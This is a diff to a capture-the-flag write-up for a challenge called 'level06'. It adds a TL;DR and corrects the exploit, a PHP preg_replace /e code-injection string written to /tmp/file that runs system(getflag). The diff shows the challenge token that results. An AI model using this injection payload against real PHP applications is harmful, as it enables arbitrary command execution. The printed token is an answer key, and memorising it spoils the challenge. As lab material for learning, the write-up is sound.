@@ -1,5 +1,15 @@
 # level06
 
+## TL;DR
+
+```bash
+~$ echo "[x {\${system(getflag)}}]" > /tmp/file
+~$ ./level06 /tmp/file
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+```
+
+## Explanation
+
 ```bash
 ~$ ls
 level06  level06.php
@@ -34,7 +44,7 @@ print $r;
 > Setting the e regex modifier will cause PHP to execute the replacement value as code
 
 ```bash
-~$ echo "[x system(getflag)]" > /tmp/file
+~$ echo "[x {\${system(getflag)}}]" > /tmp/file
 ~$ ./level06 /tmp/file
 Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 ```
